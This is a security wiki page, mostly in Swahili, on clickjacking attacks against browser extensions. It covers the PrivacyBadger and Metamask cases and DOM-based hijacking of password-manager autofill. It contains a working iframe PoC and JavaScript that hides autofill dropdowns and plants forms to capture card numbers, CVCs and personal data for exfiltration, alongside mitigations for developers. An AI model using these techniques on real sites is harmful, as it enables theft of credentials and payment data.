# BrowExt - ClickJacking

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Msingi

Ukurasa huu utatumia udhaifu wa ClickJacking katika Browser extension.\
Ikiwa haufahamu ClickJacking, angalia:


{{#ref}}
../clickjacking.md
{{#endref}}

Extensions contains the file **`manifest.json`** and that JSON file has a field `web_accessible_resources`. Here's what [the Chrome docs](https://developer.chrome.com/extensions/manifest/web_accessible_resources) say about it:

> Rasilimali hizi zitakuwa zinapatikana katika ukurasa wa wavuti kupitia URL **`chrome-extension://[PACKAGE ID]/[PATH]`**, ambayo inaweza kuzalishwa kwa **`extension.getURL method`**. Rasilimali zilizoorodheshwa zinahudumiwa na vichwa vya CORS vinavyofaa, hivyo zinapatikana kupitia mekanism kama XHR.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

The **`web_accessible_resources`** in a browser extension are not just accessible via the web; they also operate with the extension's inherent privileges. This means they have the capability to:

- Badilisha hali ya extension
- Pakia rasilimali za ziada
- Kujihusisha na browser kwa kiwango fulani

However, this feature presents a security risk. If a resource within **`web_accessible_resources`** has any significant functionality, an attacker could potentially embed this resource into an external web page. Unsuspecting users visiting this page might inadvertently activate this embedded resource. Such activation could lead to unintended consequences, depending on the permissions and capabilities of the extension's resources.

## Mfano wa PrivacyBadger

In the extension PrivacyBadger, a vulnerability was identified related to the `skin/` directory being declared as `web_accessible_resources` in the following manner (Check the original [blog post](https://blog.lizzie.io/clickjacking-privacy-badger.html)):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
Mpangilio huu ulisababisha tatizo la usalama linalowezekana. Hasa, faili `skin/popup.html`, ambayo huonyeshwa wakati wa mwingiliano na ikoni ya PrivacyBadger kwenye browser, inaweza kujumuishwa ndani ya `iframe`. Ujumuishaji huu unaweza kutumiwa kudanganya watumiaji ili kubofya bila kutarajia "Disable PrivacyBadger for this Website". Kitendo hicho kingeharibu faragha ya mtumiaji kwa kuzima ulinzi wa PrivacyBadger na kuifanya mtumiaji awe hatarini kufuatiliwa zaidi. Uonyesho wa kuona wa exploit hii unaweza kutazamiwa katika mfano wa video ya ClickJacking kwenye [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm).

Ili kushughulikia udhaifu huu, suluhisho rahisi lilitekelezwa: kuondoa `/skin/*` kutoka kwenye orodha ya `web_accessible_resources`. Mabadiliko haya yalipunguza hatari kwa kuhakikisha kuwa yaliyomo kwenye saraka `skin/` hayawezi kupatikana au kudhibitiwa kupitia web-accessible resources.

Kutengeneza ilikuwa rahisi: **ondoa `/skin/*` kutoka kwenye `web_accessible_resources`.**

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}
</style>

<div id="stuff">
<h1>Click the button</h1>
<button id="button">click me</button>
</div>

<iframe
src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Mfano wa Metamask

A [**chapisho la blogi kuhusu ClickJacking katika Metamask linaweza kupatikana hapa**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). Katika kesi hii, Metamask iliirekebisha udhaifu kwa kuangalia kwamba itifaki inayotumika kuifikia ilikuwa **`https:`** au **`http:`** (si **`chrome:`**, kwa mfano):

<figure><img src="../../images/image (21).png" alt=""><figcaption></figcaption></figure>

**Another ClickJacking fixed** katika extension ya Metamask ilikuwa kwamba watumiaji waliweza **Click to whitelist** wakati ukurasa ulionekana kama phishing kwa sababu ya `“web_accessible_resources”: [“inpage.js”, “phishing.html”]`. Kwa kuwa ukurasa huo ulikuwa hatarifu kwa Clickjacking, mshambuliaji angeweza kuutumia kwa kuonyesha kitu cha kawaida ili kumfanya mwathirika abofye Click to whitelist bila kutambua, kisha kurudi kwenye ukurasa wa phishing ambao utakuwa umeorodheshwa kwa whitelist.

## Mfano wa Steam Inventory Helper

Angalia ukurasa ufuatao kuona jinsi **XSS** katika browser extension ilivyoambatana na udhaifu wa **ClickJacking**:


{{#ref}}
browext-xss-example.md
{{#endref}}

---

## DOM-based Extension Clickjacking (Password Manager Autofill UIs)

Klasiki extension clickjacking inadhulumu `web_accessible_resources` zilizopangwa vibaya kutengeneza iframe ya HTML yenye mamlaka na kuendesha bonyezo la mtumiaji. Daraja jipya, DOM-based extension clickjacking, inalenga autofill dropdowns zilizowekwa na password managers moja kwa moja ndani ya page DOM na inatumia mbinu za CSS/DOM kuziweka fiche au kuziziba huku zikibaki zinaweza kubofywa. Bonyezo moja lililotekwa linaweza kuchagua kipengee kilichohifadhiwa na kujaza inputs zinazodhibitiwa na mshambuliaji kwa data nyeti.

### Threat model

- Mshambuliaji anadhibiti ukurasa wa wavuti (au anafikia XSS/subdomain takeover/cache poisoning kwenye domain inayohusiana).
- Mwathirika ana password manager extension iliyosakinishwa na imefunguliwa (baadhi ya autofill hufanya kazi hata inapodaiwa kuwa imefungwa).
- Angalau bonyezo moja la mtumiaji linaamshwa (cookie banners zilizowekwa juu, dialog, CAPTCHAs, michezo, n.k.).

### Mtiririko wa shambulio (manual autofill)

1. Ingiza fomu isiyoonekana lakini inayoweza kupokea focus (login/PII/credit-card fields).
2. Weka focus kwenye input ili kuitisha autofill dropdown ya extension karibu na uwanja.
3. Ficha au kufunika UI ya extension huku ikibaki inaweza kuingiliana nayo.
4. Panga udhibiti unaoonekana wa kweli chini ya dropdown iliyofichwa ili kusukuma bonyezo linalochagua kipengee.
5. Soma thamani zilizojazwa kutoka kwenye fomu ya mshambuliaji na uzitoe nje.

### How to hide the autofill UI

- Extension element
- Root element opacity (generic):
```js
// Reduce or nullify opacity of the extension root
// Works when the root element is attached in the page DOM
const root = document.querySelector('protonpass-root')
if (root) root.style.opacity = 0
```
- Mtoto ndani ya ShadowRoot iliyofunguka (tagi ya dinamiki, ficha iframe ya ndani):
```js
// Find dynamic root like <protonpass-root-xyz> and hide its child iframe
const root = Array.from(document.querySelectorAll('*'))
.find(el => el.tagName.toLowerCase().startsWith('protonpass-root-'))
if (root?.shadowRoot) {
const frame = root.shadowRoot.querySelector('iframe')
if (frame) frame.style.cssText += 'opacity:0 !important;'
}
```
- elementi mzazi
- Mbinu za opacity za BODY/HTML za kufanya UI ya extension isionezeke wakati ukurasa unaonekana wa kawaida (kwa mfano, mandharinyuma ya screenshot):
```js
// Hide full page, then reveal a tiny amount to keep clicks working
document.body.style.opacity = 0
// Optional: Show a screenshot/lookalike to avoid a blank screen
// document.documentElement.style.backgroundImage = 'url(website.png)'

// Inject a credit-card form and focus to trigger dropdown
/* create #cardform with #cardnumber, #expiry, #cvc */
document.getElementById('cardnumber').focus()
// Make body barely visible to allow user interaction
document.body.style.opacity = '0.001'

function getCardValues() {
const num = document.getElementById('cardnumber').value
const exp = document.getElementById('expiry').value
const cvc = document.getElementById('cvc').value
// exfiltrate via XHR/fetch/websocket
}
```
- Overlay
- Partial overlay: kuficha kila kitu isipokuwa pikseli chache ili dropdown iendelee kubonyezwa (hakikisha attacker overlay iko mwisho katika DOM na max z-index, au tumia Top Layer).
- Full overlay using pointer-events:none ili bonyeza zipite kwa dropdown iliyofichwa; ifanye kuwa ya kudumu kwa Popover API:
```html
<div id="overlay" popover style="pointer-events:none;">Cookie consent</div>
<script>
overlay.showPopover()
// Inject a personal data form and focus to trigger dropdown
/* create #personalform with #name/#email/#phone/... */
document.getElementById('name').focus()
function getData(){ /* read + exfil values on change */ }
</script>
```
### Kuweka bonyezo la mwathiriwa

- Fixed placement: weka dropdown iliyofichwa chini ya udhibiti unaoonekana kuwa wa kweli kama “Accept cookies”, “Close”, au checkbox ya CAPTCHA.
- Follow-mouse: hamisha input iliyo na focus chini ya kursor ili dropdown iimfuate; ulangazelea tena mara kwa mara ili bonyezo moja mahali popote lichague kipengee:
```js
const f = document.getElementById('name')
document.addEventListener('mousemove', e => {
personalform.style = `top:${e.pageY-50}px;left:${e.pageX-100}px;position:absolute;`
// some managers hide the dropdown if focus is lost; refocus slowly
setTimeout(() => f.focus(), 100)
})
```
### Athari na matukio

- Tovuti inayodhibitiwa na mshambuliaji: bofya moja iliyelazimishwa inaweza exfiltrate data za kadi ya mkopo (nambari/expiry/CVC) na taarifa binafsi (jina, email, simu, anwani, DOB) ambazo haziko kwa mipaka ya domain.
- Tovuti ya kuaminika yenye XSS/subdomain takeover/cache poisoning: wizi kwa bofya nyingi wa credentials (username/password) na TOTP, kwa sababu mameneja wengi hufanya autofill across subdomains/mizazi inayohusiana (mfano, `*.example.com`).
- Passkeys: ikiwa RP haifungi WebAuthn challenges kwa session, XSS inaweza intercept assertion iliyosainiwa; DOM-based clickjacking inaficha onyo la passkey ili kuchochea bofya la kuthibitisha kutoka kwa mtumiaji.

### Vizingiti

- Inahitaji angalau bofya moja kutoka kwa mtumiaji na ulinganifu mzuri wa pikseli (overlays za kweli hufanya iwe rahisi kusababisha bofya).
- Auto-lock/logout hupunguza dirisha la matumizi; baadhi ya mameneja bado hufanya autofill wakati wa “locked”.

### Mikakati kwa waendelezaji wa extension

- Render UI ya autofill katika Top Layer (Popover API) au vinginevyo hakikisha iko juu ya stacking ya ukurasa; epuka kufunikwa na overlays zinazosimamiwa na ukurasa.
- Kataa uharibu wa CSS: pendelea Closed Shadow DOM na fuatilia kwa `MutationObserver` mabadiliko ya mtindo yenye shaka kwenye mizizi ya UI.
- Gundua overlays zenye uadui kabla ya kujaza: orodhesha elementi nyingine za top-layer/popover, zima kwa muda `pointer-events:none`, na tumia `elementsFromPoint()` kubaini occlusion; funga UI ikiwa overlays zipo.
- Gundua mabadiliko ya opacity au mtindo ya `<body>`/`<html>` yenye shaka kabla na baada ya ku-render.
- Kwa masuala yanayotokana na iframe: panga MV3 `web_accessible_resources` `matches` kwa ukali na epuka kufichua UI za HTML; kwa HTML zisizoepukika, tumia `X-Frame-Options: DENY` au `Content-Security-Policy: frame-ancestors 'none'`.

## Marejeo

- [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
- [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

{{#include ../../banners/hacktricks-training.md}}
